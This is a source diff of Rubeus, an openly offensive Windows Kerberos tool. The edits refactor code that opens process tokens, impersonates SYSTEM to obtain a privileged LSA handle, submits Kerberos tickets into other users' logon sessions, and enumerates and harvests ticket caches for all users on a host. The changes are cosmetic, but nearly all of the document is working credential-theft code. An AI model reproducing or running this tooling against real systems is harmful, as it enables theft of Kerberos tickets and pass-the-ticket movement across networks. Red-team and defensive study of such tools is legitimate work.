@@ -42,23 +42,21 @@ namespace Rubeus
             try {
                 // TOKEN_QUERY == 0x0008
                 if (!Interop.OpenProcessToken(pi.hProcess, 0x0008, out hToken)) {
-                    uint lastError = Interop.GetLastError();
-                    Console.WriteLine("[X] OpenProcessToken error: {0}", lastError);
+                    Console.WriteLine("[X] OpenProcessToken error: {0}", Interop.GetLastError());
                     return 0;
                 }
-                // first call gets lenght of TokenInformation to get proper struct size
+                // first call gets length of TokenInformation to get proper struct size
                 int TokenInfLength = 0;
                 bool Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics,
                     IntPtr.Zero, TokenInfLength, out TokenInfLength);
                 TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
-
                 // second call actually gets the information
                 if (!Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength)) {
                     return 0;
                 }
-                Interop.LUID authId = ((Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS))).AuthenticationId;
-                Console.WriteLine("[+] LUID            : {0}", authId.LowPart);
-                return authId.LowPart;
+                uint identifier = (((Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS))).AuthenticationId).LowPart;
+                Console.WriteLine("[+] LUID            : {0}", identifier);
+                return identifier;
             }
             finally {
                 Interop.CloseHandle(hToken);
@@ -142,7 +140,7 @@ namespace Rubeus
             // if the original call fails then it is likely we don't have SeTcbPrivilege
             // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
             if (lsaHandle == IntPtr.Zero) {
-                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                string currentName = WindowsIdentity.GetCurrent().Name;
                 if (currentName == "NT AUTHORITY\\SYSTEM") {
                     // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                     lsaHandle = RegisterUser32LogonProcesss();
@@ -476,7 +474,7 @@ namespace Rubeus
             //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971
 
             IntPtr LsaHandle = IntPtr.Zero;
-            int AuthenticationPackage;
+            int authenticationPackage;
             int ProtocalStatus;
 
             if (0 != targetLuid) {
@@ -484,7 +482,7 @@ namespace Rubeus
                     Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                     return;
                 }
-                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                string currentName = WindowsIdentity.GetCurrent().Name;
                 if (currentName == "NT AUTHORITY\\SYSTEM") {
                     // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                     LsaHandle = RegisterUser32LogonProcesss();
@@ -507,17 +505,14 @@ namespace Rubeus
             IntPtr ProtocolReturnBuffer;
             int ReturnBufferLength;
             try {
-                NativeReturnCode ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, KerberosLsaInputString, out AuthenticationPackage);
+                NativeReturnCode ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, KerberosLsaInputString, out authenticationPackage);
                 if (ntstatus != 0) {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                     Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
                     return;
                 }
-                Interop.KERB_SUBMIT_TKT_REQUEST request = new Interop.KERB_SUBMIT_TKT_REQUEST();
-                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
-                request.KerbCredSize = ticket.Length;
-                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));
-
+                Interop.KERB_SUBMIT_TKT_REQUEST request = new Interop.KERB_SUBMIT_TKT_REQUEST(
+                    Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage, ticket.Length);
                 if (0 != targetLuid) {
                     Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
                     request.LogonId = new Interop.LUID(targetLuid);
@@ -527,8 +522,8 @@ namespace Rubeus
                 inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                 Marshal.StructureToPtr(request, inputBuffer, false);
                 Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
-                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
-                if (ntstatus != 0) {
+                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, authenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
+                if (0 != ntstatus) {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                     Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
                     return;
@@ -550,7 +545,7 @@ namespace Rubeus
             }
         }
 
-        internal static void ListKerberosTicketData(uint targetLuid = 0, string targetService = "",
+        internal static void ListKerberosTicketData(Interop.LUID targetLuid, string targetService = "",
             bool monitor = false)
         {
             // lists 
@@ -688,7 +683,7 @@ namespace Rubeus
             }
         }
 
-        internal static void ListKerberosTicketDataAllUsers(uint targetLuid = 0, string targetService = "", bool monitor = false, bool harvest = false)
+        internal static void ListKerberosTicketDataAllUsers(Interop.LUID targetLuid, string targetService = "", bool monitor = false, bool harvest = false)
         {
             // extracts Kerberos ticket data for all users on the system (assuming elevation)
 
@@ -705,7 +700,7 @@ namespace Rubeus
             if (!monitor) {
                 Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (All Users)\r\n");
             }
-            if (targetLuid != 0) {
+            if (!targetLuid.IsEmpty) {
                 Console.WriteLine("[*] Target LUID     : 0x{0:x}", targetLuid);
             }
             if (!String.IsNullOrEmpty(targetService)) {
@@ -723,7 +718,7 @@ namespace Rubeus
             // if the original call fails then it is likely we don't have SeTcbPrivilege
             // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
             if (lsaHandle == IntPtr.Zero) {
-                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                string currentName = WindowsIdentity.GetCurrent().Name;
                 if (currentName == "NT AUTHORITY\\SYSTEM") {
                     // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                     lsaHandle = RegisterUser32LogonProcesss();
@@ -774,14 +769,14 @@ namespace Rubeus
                         int protocalStatus = 0;
 
                         // input object for querying the ticket cache for a specific logon ID
-                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID.LowPart);
+                        Interop.LUID userLogonID = data.LoginID;
                         Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery =
                             new Interop.KERB_QUERY_TKT_CACHE_REQUEST(userLogonID);
                         Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets =
                             new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                         Interop.KERB_TICKET_CACHE_INFO ticket;
 
-                        if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid)) {
+                        if (targetLuid.IsEmpty || data.LoginID.Equals(targetLuid)) {
                             tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;
 
                             // query LSA, specifying we want the ticket cache
@@ -1089,7 +1084,7 @@ namespace Rubeus
                     return;
                 }
                 else {
-                    string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                    string currentName = WindowsIdentity.GetCurrent().Name;
                     if (currentName == "NT AUTHORITY\\SYSTEM") {
                         // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                         LsaHandle = RegisterUser32LogonProcesss();
@@ -1201,9 +1196,9 @@ namespace Rubeus
                     return null;
                 }
                 Interop.SecBufferDesc ClientToken = new Interop.SecBufferDesc(12288);
-                Interop.SECURITY_HANDLE ClientContext = new Interop.SECURITY_HANDLE(0);
+                Interop.SECURITY_HANDLE ClientContext = new Interop.SECURITY_HANDLE();
                 uint ClientContextAttributes = 0;
-                Interop.SECURITY_INTEGER ClientLifeTime = new Interop.SECURITY_INTEGER(0);
+                Interop.SECURITY_INTEGER ClientLifeTime = new Interop.SECURITY_INTEGER();
                 int SECURITY_NATIVE_DREP = 0x00000010;
                 int SEC_E_OK = 0x00000000;
                 int SEC_I_CONTINUE_NEEDED = 0x00090312;
